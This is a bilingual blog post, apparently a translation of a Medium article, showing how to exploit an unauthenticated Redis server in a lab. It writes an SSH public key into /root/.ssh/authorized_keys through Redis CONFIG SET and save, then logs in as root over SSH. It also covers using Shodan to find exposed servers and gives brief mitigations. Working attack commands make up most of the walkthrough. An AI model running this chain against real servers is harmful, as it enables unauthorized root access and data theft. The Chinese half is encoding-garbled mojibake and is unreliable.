---
title: redis unauthorized access vulnerability simulation(redisæœªç»æˆæƒçš„è®¿é—®æ¼æ´æ¨¡æ‹Ÿ)
date: 2019-04-06 20:43:02
tags:
- redis
- å®‰å…¨
categories:
- ç¿»è¯‘
comments: true
---

Redis, is an open source, widely popular data structure tool that can be used as an in-memory distributed database, message broker or cache. Since it is designed to be accessed inside trusted environments, it should not be exposed on the Internet. However, some Redisâ€™ are bind to public interface and even has no password authentication protection.

Redisæ˜¯ä¸€ä¸ªå¼€æºçš„ã€å¹¿æ³›æµè¡Œçš„æ•°æ®ç»“æ„å·¥å…·ï¼Œå¯ä»¥ç”¨ä½œå†…å­˜ä¸­çš„åˆ†å¸ƒå¼æ•°æ®åº“ã€æ¶ˆæ¯ä»£ç†æˆ–ç¼“å­˜ã€‚å› ä¸ºå®ƒè¢«è®¾è®¡ä¸ºåœ¨å—ä¿¡ä»»çš„ç¯å¢ƒä¸­è®¿é—®ï¼Œæ‰€ä»¥ä¸åº”è¯¥åœ¨ Internet ä¸Šå…¬å¼€ã€‚ç„¶è€Œï¼Œä¸€äº› Redis ç»‘å®šåˆ°å…¬å…±æ¥å£ï¼Œç”šè‡³æ²¡æœ‰å¯†ç èº«ä»½éªŒè¯ä¿æŠ¤ã€‚

Under certain conditions, if Redis runs with the root account (or not even), attackers can write an SSH public key file to the root account, directly logging on to the victim server through SSH. This may allow hackers to gain server privileges, delete or steal data, or even lead to an encryption extortion, critically endangering normal business services.

åœ¨æŸäº›æ¡ä»¶ä¸‹ï¼Œå¦‚æœRedisä½¿ç”¨ root å¸æˆ·è¿è¡Œï¼ˆç”šè‡³ä¸ä½¿ç”¨ï¼‰ï¼Œæ”»å‡»è€…å¯ä»¥å‘æ ¹å¸æˆ·å†™å…¥ SSH å…¬é’¥æ–‡ä»¶ï¼Œç›´æ¥é€šè¿‡ SSH ç™»å½•åˆ°å—å®³æœåŠ¡å™¨ã€‚è¿™å¯èƒ½ä½¿é»‘å®¢è·å¾—æœåŠ¡å™¨ç‰¹æƒï¼Œåˆ é™¤æˆ–çªƒå–æ•°æ®ï¼Œç”šè‡³å¯¼è‡´åŠ å¯†å‹’ç´¢ï¼Œä¸¥é‡å±å®³æ­£å¸¸çš„ä¸šåŠ¡æœåŠ¡ã€‚

The simplified flow of this exploit is:

* Login to a unprotected Redis
* Change itâ€™s backup location to .ssh directoryâ€Šâ€”â€ŠWrite the SSH Keys to new backup location
* Remote connect and login to the target server using SSH key

We should already be familiar how automatic SSH login with private + public keys works.

ç®€åŒ–å®ç°æµç¨‹å¦‚ä¸‹ï¼š

* ç™»å½•åˆ°ä¸€ä¸ªæ— ä¿æŠ¤çš„ Redis
* å°†å¤‡ä»½ä½ç½®æ›´æ”¹ä¸º .ssh ç›®å½• â€”â€” å°†SSHå¯†é’¥å†™å…¥æ–°çš„å¤‡ä»½ä½ç½®
* ä½¿ç”¨ SSH å¯†é’¥è¿œç¨‹è¿æ¥å¹¶ç™»å½•åˆ°ç›®æ ‡æœåŠ¡å™¨

æˆ‘ä»¬åº”è¯¥å·²ç»ç†Ÿæ‚‰äº†å¦‚ä½•ä½¿ç”¨ç§æœ‰+å…¬é’¥è‡ªåŠ¨ç™»å½• SSHã€‚

## Simulation

## æ¨¡æ‹Ÿ

Now letâ€™s get our feet wet and set up a target machine. Weâ€™ll need two machines, they can be real machines, virtual machines, or remote machines (VPS). As long as the attack end is able to ping the target end, we are good.

ç°åœ¨è®©æˆ‘ä»¬å…ˆæŠŠåšå¥½æ¨¡æ‹Ÿå‰å‡†å¤‡ã€‚æˆ‘ä»¬éœ€è¦ä¸¤å°æœºå™¨ï¼Œå®ƒä»¬å¯ä»¥æ˜¯çœŸæ­£çš„æœºå™¨ã€è™šæ‹Ÿæœºæˆ–è¿œç¨‹æœºå™¨(VPS)ã€‚åªè¦æ”»å‡»ç«¯èƒ½å¤Ÿ ping ç›®æ ‡ç«¯å°±å¯ä»¥äº†ã€‚

Environment setup for this example:

* Target Machine: Redis-3.2.11 on Ubuntu
* Attack Machine: Platform you like with Redis (I used Kali)

ç¤ºä¾‹ä¸­çš„ç¯å¢ƒå¦‚ä¸‹ï¼š

* ç›®æ ‡æœºå™¨ï¼šubuntu ä¸‹æœ‰ Redis-3.2.11
* æ”»å‡»æœºå™¨ï¼šä½ å–œæ¬¢çš„å¹³å°ä¸ Redis(æˆ‘ç”¨çš„æ˜¯ Kali)

### Set Up Target Machine:

### è®¾å®šç›®æ ‡æœºå™¨ï¼š

First, let us set up the target machine with Redis. Download source code by

é¦–å…ˆï¼Œè®©æˆ‘ä»¬é…ç½®ç›®æ ‡æœºå™¨çš„ Reidsã€‚ä¸‹è½½æºä»£ç 

```
wget http://download.redis.io/releases/redis-3.2.11.tar.gz
```

Extract and build

æå–å’Œæ„å»º

```
tar xzf redis-3.2.11.tar.gz cd redis-3.2.11
make
```

After make, we use our favorite editor to open `redis.conf` in `redis-3.2.11` folder. In order to be remotely accessed, we will need to comment out line `bind 127.0.0.1` and disable `protected-mode` as shown below.

ç¼–è¯‘åï¼Œæˆ‘ä»¬ä½¿ç”¨æˆ‘ä»¬æœ€å–œæ¬¢çš„ç¼–è¾‘å™¨æ‰“å¼€ `redis-3.2.11` æ–‡ä»¶å¤¹ çš„ `redis.conf`ã€‚ä¸ºäº†è¿œç¨‹è®¿é—®ï¼Œæˆ‘ä»¬éœ€è¦æ³¨é‡Šæ‰ `bind 127.0.0.1` è¡Œï¼Œå¹¶ç¦ç”¨ `protected-mode`ï¼Œå¦‚ä¸‹æ‰€ç¤ºã€‚

![](/img/review/0_UqCMKzd401p_9xgf.png)

Now fire up Redis with the configuration file we just edited. Note that `redis-server` is in `redis-3.2.11/src`.

ç°åœ¨ç”¨æˆ‘ä»¬åˆšåˆšç¼–è¾‘çš„é…ç½®æ–‡ä»¶å¯åŠ¨Redisã€‚æ³¨æ„ `redis-server` åœ¨ `redis-3.2.11/src` ä¸­ã€‚

```
src/redis-server redis.conf
```

So far, we have finished setting up the target server. Additionally, we should also check if we have `.ssh` folder. If not, we should create it for the attack later.

åˆ°ç›®å‰ä¸ºæ­¢ï¼Œæˆ‘ä»¬å·²ç»å®Œæˆäº†ç›®æ ‡æœåŠ¡å™¨çš„è®¾ç½®ã€‚æ­¤å¤–ï¼Œæˆ‘ä»¬è¿˜åº”è¯¥æ£€æŸ¥æˆ‘ä»¬æ˜¯å¦æœ‰ `.ssh`çš„æ–‡ä»¶å¤¹ã€‚å¦‚æœæ²¡æœ‰ï¼Œæˆ‘ä»¬åº”è¯¥ä¸ºä»¥åçš„æ”»å‡»åˆ›å»ºå®ƒã€‚

### Attack Machine:

### æ”»å‡»æœºå™¨ï¼š

First, make sure we can ping the target. Then, we will generate a private key and public key for SSHing into the target machine later. Run the following command to generate SSH keys and leave passphrase empty.

é¦–å…ˆï¼Œç¡®ä¿æˆ‘ä»¬èƒ½é”å®šç›®æ ‡ã€‚ç„¶åï¼Œæˆ‘ä»¬å°†ç”Ÿæˆç§é’¥å’Œå…¬é’¥ï¼Œä»¥ä¾¿ç¨åå°†å…¶æ’å…¥ç›®æ ‡æœºå™¨ã€‚è¿è¡Œä»¥ä¸‹å‘½ä»¤ç”ŸæˆSSHå¯†é’¥ï¼Œå¹¶ä¿ç•™å¯†ç ä¸ºç©ºã€‚

```
ssh-keygen -t rsa
```

Next, enter the `.ssh` folder. If you are root user, enter `/.ssh`, otherwise `~/.ssh`, then copy the private key in to `temp.txt`.

ä¸‹ä¸€æ­¥ï¼Œè¿›å…¥ `.ssh` ç›®å½•ã€‚å¦‚æœä½ æ˜¯ root ç”¨æˆ·ï¼Œè¿›å…¥ `/.ssh`ï¼Œå…¶ä»–çš„è¿›å…¥ `~/.ssh`ã€‚å¤åˆ¶ç§é’¥åˆ° `temp.txt`ã€‚

```
(echo -e "\n\n"; cat id_rsa.pub; echo -e "\n\n") > temp.txt
```

Some may be wondering that why do we put two blank lines before and after the public key? We will leave that as a mystery for right now if you donâ€™t know :)

æœ‰äº›äººå¯èƒ½æƒ³çŸ¥é“ï¼Œä¸ºä»€ä¹ˆåœ¨å…¬é’¥ä¹‹å‰å’Œä¹‹åè¦æ”¾ä¸¤è¡Œç©ºç™½?å¦‚æœä½ ä¸çŸ¥é“ï¼Œæˆ‘ä»¬æš‚æ—¶æŠŠå®ƒä½œä¸ºä¸€ä¸ªè°œ :)

![](/img/review/0_kj5v1UOnDs4_1B-4.png)

Good! So far we have generated a pair a keys, we will need to find a way to smuggle the public key to the Redis server (target machine.)

å¥½äº†ï¼åˆ°ç›®å‰ä¸ºæ­¢ï¼Œæˆ‘ä»¬å·²ç»ç”Ÿæˆäº†ä¸€å¯¹å¯†é’¥ï¼Œæˆ‘ä»¬å°†éœ€è¦æ‰¾åˆ°ä¸€ç§æ–¹æ³•å°†å…¬é’¥å·è¿åˆ°RedisæœåŠ¡å™¨(ç›®æ ‡æœºå™¨)ã€‚


We are going to use `redis-cli`, the Redis command line interface, to send commands to Redis and read the replies sent by the server directly in the terminal.

æˆ‘ä»¬å°†ä½¿ç”¨ `redis-cli`ï¼Œå³ Redis å‘½ä»¤è¡Œæ¥å£ï¼Œå‘ Redis å‘é€å‘½ä»¤ï¼Œå¹¶ç›´æ¥è¯»å–ç»ˆç«¯æœåŠ¡å™¨å‘é€çš„å“åº”ã€‚

Run the following commands in `redis-3.2.11/src` folder. (Or depending where we are, we can always specify the path to the files we use)

åœ¨ `redis-3.2.11/src` æ–‡ä»¶å¤¹ä¸­è¿è¡Œä»¥ä¸‹å‘½ä»¤ã€‚(æˆ–è€…æ ¹æ®æˆ‘ä»¬çš„ä½ç½®ï¼Œæˆ‘ä»¬æ€»æ˜¯å¯ä»¥æŒ‡å®šæˆ‘ä»¬ä½¿ç”¨çš„æ–‡ä»¶çš„è·¯å¾„)

```
cat /.ssh/temp.txt | redis-cli -h 203.137.255.255 -x set s-key
```

Here, letâ€™s take a look at the command. We use `-h` flag to specify the remote Redis server IP so that `redis-cli` knows where to connect and send commands. The part after `-x` is saying that we are setting the key in redis named `s-key` with the value in `temp.txt`.

åœ¨è¿™é‡Œï¼Œè®©æˆ‘ä»¬çœ‹ä¸€ä¸‹å‘½ä»¤ã€‚æˆ‘ä»¬ä½¿ç”¨ `-h` æ ‡å¿—æ¥æŒ‡å®šè¿œç¨‹ Redis æœåŠ¡å™¨ IPï¼Œä»¥ä¾¿ `redis-cli` çŸ¥é“åœ¨ä½•å¤„è¿æ¥å’Œå‘é€å‘½ä»¤ã€‚`-x` åé¢çš„éƒ¨åˆ†è¡¨ç¤ºï¼Œæˆ‘ä»¬æ­£åœ¨è®¾ç½® redis ä¸­çš„é”®åä¸º `s-key`ï¼Œå…¶å€¼ä½äº `temp.txt` ä¸­ã€‚

![](/img/review/0_RXLExaGb28VkI0xO.png)

Yea, we have a key with our SSH key sneaked in! Letâ€™s connect to the Redis and play around its configuration. Use `redis-cli` to connect to the Redis server again.

æ˜¯çš„ï¼Œæˆ‘ä»¬æœ‰ä¸€ä¸ªå¯†é’¥ï¼ŒSSH å¯†é’¥å·å·æºœè¿›æ¥äº†!è®©æˆ‘ä»¬è¿æ¥åˆ°Rediså¹¶ç ”ç©¶å®ƒçš„é…ç½®ã€‚å†æ¬¡ä½¿ç”¨ `redis-cli` è¿æ¥åˆ° Redis æœåŠ¡å™¨ã€‚

![](/img/review/0_ly-kkskrTIJ72LFM.png)

Looking at the above screenshot, we first verify the value of the key `s-key` by using the command `GET s-key`, which is what we want â€“ the public key with two blank lines before and after. Then I tried the command â€œdirâ€ just to see what it says (kidding). What we actually want to do here is to get the value of â€œs-keyâ€ (SSH public key) stored in the `.ssh` folder so that we can remote SSH login to the target machine whithout having to type the password.

æŸ¥çœ‹ä¸Šé¢çš„å±å¹•æˆªå›¾ï¼Œæˆ‘ä»¬é¦–å…ˆä½¿ç”¨å‘½ä»¤ `GET s-key` æ¥éªŒè¯é”® `s-key` çš„å€¼ï¼Œè¿™æ­£æ˜¯æˆ‘ä»¬æƒ³è¦çš„â€”â€”å‰åå„æœ‰ä¸¤è¡Œç©ºç™½çš„å…¬é’¥ã€‚ç„¶åï¼Œæˆ‘å°è¯•å‘½ä»¤ â€œdirâ€ï¼Œåªæ˜¯ä¸ºäº†çœ‹çœ‹å®ƒè¯´äº†ä»€ä¹ˆ(å¼€ç©ç¬‘)ã€‚è¿™é‡Œæˆ‘ä»¬çœŸæ­£æƒ³åšçš„æ˜¯è·å–å­˜å‚¨åœ¨ `.ssh` æ–‡ä»¶å¤¹ä¸­çš„â€œs-keyâ€(SSHå…¬é’¥)çš„å€¼ï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥è¿œç¨‹sshç™»å½•åˆ°ç›®æ ‡æœºå™¨ï¼Œè€Œä¸éœ€è¦è¾“å…¥å¯†ç ã€‚

Thus, we will do this:

å› æ­¤ï¼Œæˆ‘ä»¬å°†è¿™æ ·åš:

```
CONFIG GET dir # get your redis directory
# In the output of above command "/home/xxxx/redis-3.2.11/src" is the directory where redis server is installed. CONFIG SET dir
/home/xxxx/.ssh # set the backup location to the .ssh folder
(or) CONFIG SET dir /root/.ssh CONFIG SET dbfilename authorized_keys
# lastly we back our data containing our "s-key" key-value pair up in the .ssh folder
save
```

> The authorized_keys file in SSH specifies the SSH keys that can be used for logging into the user account for which the file is configured Source: [ssh.com](https://www.ssh.com/ssh/authorized_keys/)
The screenshot shown above already demonstrates the steps mentioned here.

> SSHä¸­çš„ authorized_keys æ–‡ä»¶æŒ‡å®šäº† SSH å¯†é’¥ï¼Œå¯ç”¨äºç™»å½•åˆ°æ–‡ä»¶é…ç½®æºçš„ç”¨æˆ·å¸æˆ·: [ssh.com](https://www.ssh.com/ssh/authorized_keys/)
ä¸Šé¢çš„æˆªå›¾å·²ç»æ¼”ç¤ºäº†è¿™é‡Œæåˆ°çš„æ­¥éª¤ã€‚

### Harvest Time

### ç»“æœæ—¶é—´

On Attack Machine, try to SSH in the Target Machine using the following command.

åœ¨æ”»å‡»æœºå™¨ä¸Šï¼Œå°è¯•ä½¿ç”¨ä¸‹é¢çš„å‘½ä»¤åœ¨ç›®æ ‡æœºå™¨ä¸ŠSSHã€‚

```
# command: private key username@server IP
ssh -i id_rsa username@203.137.255.255
```

![](/img/review/0_xTWYFYecso8XJKdI.png)

YAS! As we can see, we have a successful auto-login with SSH keys! Voila, we have now completed the attack simulation. ğŸ˜ƒ

å¥½ï¼Œå¯ä»¥çœ‹åˆ°ï¼Œæˆ‘ä»¬æˆåŠŸåœ°ä½¿ç”¨ SSH å¯†é’¥è‡ªåŠ¨ç™»å½•!ç§ï¼Œæˆ‘ä»¬ç°åœ¨å·²ç»å®Œæˆäº†æ”»å‡»æ¨¡æ‹Ÿã€‚ğŸ˜ƒ

(Smiley face actually means that Iâ€™m finally almost done writing this up ğŸ˜‚)

(ç¬‘è„¸å®é™…ä¸Šæ„å‘³ç€æˆ‘å·®ä¸å¤šå†™å®Œäº†ğŸ˜‚)

At the end of this section, I would like to show what is Redisâ€™s backup file look like.

åœ¨æœ¬èŠ‚çš„æœ€åï¼Œæˆ‘æƒ³å±•ç¤ºä¸€ä¸‹ä»€ä¹ˆæ˜¯ Redis çš„å¤‡ä»½æ–‡ä»¶ã€‚

![](/img/review/0_wjEeD2SSdTnymBVT.png)

Notice the unreadable characters? Add â€œ\n\nâ€ before and after the key content was just to be safe and separate it from other â€œstuffâ€ so that it can be parsed correctly. ğŸ‘Œ

æ³¨æ„åˆ°è¿™äº›ä¸å¯è¯»çš„å­—ç¬¦äº†å—?åœ¨å…³é”®å†…å®¹ä¹‹å‰å’Œä¹‹åæ·»åŠ â€œ\n\nâ€åªæ˜¯ä¸ºäº†å®‰å…¨èµ·è§ï¼Œå¹¶å°†å…¶ä¸å…¶ä»–â€œå†…å®¹â€åˆ†å¼€ï¼Œä»¥ä¾¿æ­£ç¡®è§£æã€‚

## Use Search Engine to find Vulnerable Redis Servers

## ä½¿ç”¨æœç´¢å¼•æ“æŸ¥æ‰¾æ˜“å—æ”»å‡»çš„RedisæœåŠ¡å™¨

Alrighty, as I mentioned, we are going to use [Shodan](https://www.shodan.io/) to search servers that has Redis footprint (characteristics).

å¥½çš„ï¼Œæ­£å¦‚æˆ‘æåˆ°çš„ï¼Œæˆ‘ä»¬å°†ä½¿ç”¨ [Shodan](https://www.shodan.io/) æ¥æœç´¢å…·æœ‰ Redis footprint(ç‰¹å¾)çš„æœåŠ¡å™¨ã€‚

Let us do a simple search by Redisâ€™ default port.

è®©æˆ‘ä»¬åšä¸€ä¸ªç®€å•çš„æœç´¢ï¼Œé€šè¿‡Redisçš„é»˜è®¤ç«¯å£ã€‚

![](/img/review/0_ueth-xQWtxJobzwL.png)

Looks like we have 75,665 search results. Aaaaaand guess what! Right down there (not shown but we can see it if we scroll down) there are TONS of host that has NO password protection!!

çœ‹èµ·æ¥æˆ‘ä»¬æœ‰ 75,665 ä¸ªæœç´¢ç»“æœã€‚çŒœçŒœçœ‹!å°±åœ¨é‚£é‡Œ(æ²¡æœ‰æ˜¾ç¤ºï¼Œä½†æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œå¦‚æœæˆ‘ä»¬å‘ä¸‹æ»šåŠ¨)æœ‰äº›ä¸»æœºæ²¡æœ‰å¯†ç ä¿æŠ¤!!

This vulnerability was found years ago and still countless of machines are opening up themselves in such an easy way for attackers to have fun in there serverâ€¦

è¿™ä¸ªæ¼æ´æ˜¯å‡ å¹´å‰å‘ç°çš„ï¼Œä»ç„¶æœ‰æ— æ•°çš„æœºå™¨ä»¥è¿™ç§ç®€å•çš„æ–¹å¼æ‰“å¼€è‡ªå·±ï¼Œè®©æ”»å‡»è€…åœ¨é‚£é‡Œçš„æœåŠ¡å™¨ä¸­å¾—åˆ°ä¹è¶£â€¦

According to Shodan, there are around **56,000 unprotected** Redis instances in 2015.

æ ¹æ® Shodan çš„æ•°æ®ï¼Œ2015 å¹´å¤§çº¦æœ‰ 5,6000 ä¸ªä¸å—ä¿æŠ¤çš„Rediså®ä¾‹ã€‚

![](/img/review/0_C2n27eAOGFkK79IU.png)

According to ZoomEye, the distribution of the instances is.

æ ¹æ® ZoomEyeï¼Œå®ä¾‹çš„åˆ†å¸ƒæ˜¯ã€‚

![](img/0_m19lcFYeFOhB_Nui.png)

According to ZoomEye, the top ranking countries of these instances are: China, USA, Germanyâ€¦

ZoomEyeè¡¨ç¤ºï¼Œè¿™äº›ä¾‹å­ä¸­æ’åæœ€é«˜çš„å›½å®¶æ˜¯:ä¸­å›½ã€ç¾å›½ã€å¾·å›½â€¦â€¦

![](img/0_hxf9oaOFJVDohZMC.png)

Okay, back to the business. So how do we verify if a server is protected using python? It turns out to be fairly simple.

å¥½äº†ï¼Œå›åˆ°æ­£é¢˜ã€‚é‚£ä¹ˆï¼Œæˆ‘ä»¬å¦‚ä½•éªŒè¯æ˜¯å¦ä½¿ç”¨ python ä¿æŠ¤æœåŠ¡å™¨å‘¢ï¼Ÿç»“æœç›¸å½“ç®€å•ã€‚

1. Use socket to connect to the target IP
2. Perform a GET request
3. If the server is unprotected, you GET request will succeed; otherwise it will fail

4. ä½¿ç”¨å¥—æ¥å­—è¿æ¥åˆ°ç›®æ ‡IP
5. æ‰§è¡ŒGETè¯·æ±‚
6. å¦‚æœæœåŠ¡å™¨ä¸å—ä¿æŠ¤ï¼Œæ‚¨çš„GETè¯·æ±‚å°†æˆåŠŸ;å¦åˆ™å°±ä¼šå¤±è´¥

![](img/0_C4_dcCGWAPWxFbaU.png)

## Mitigation

## å‡è½»

* Donâ€™t bind to 0.0.0.0
* If you have to, change the default port (6379)
* Set a password (for everything)

* ä¸è¦ç»‘å®š 0.0.0.0
* å¦‚æœæœ‰å¿…è¦çš„è¯ï¼Œä¿®æ”¹é»˜è®¤ç«¯å£ (6379)
* ä¸ºæ‰€æœ‰çš„ Reids è®¾ç½®å¯†ç 

Sep 11, 2018 ï¼ˆ2018-09-11ï¼‰

author: Victor Zhu

link: <https://medium.com/@Victor.Z.Zhu/redis-unauthorized-access-vulnerability-simulation-victor-zhu-ac7a71b2e419>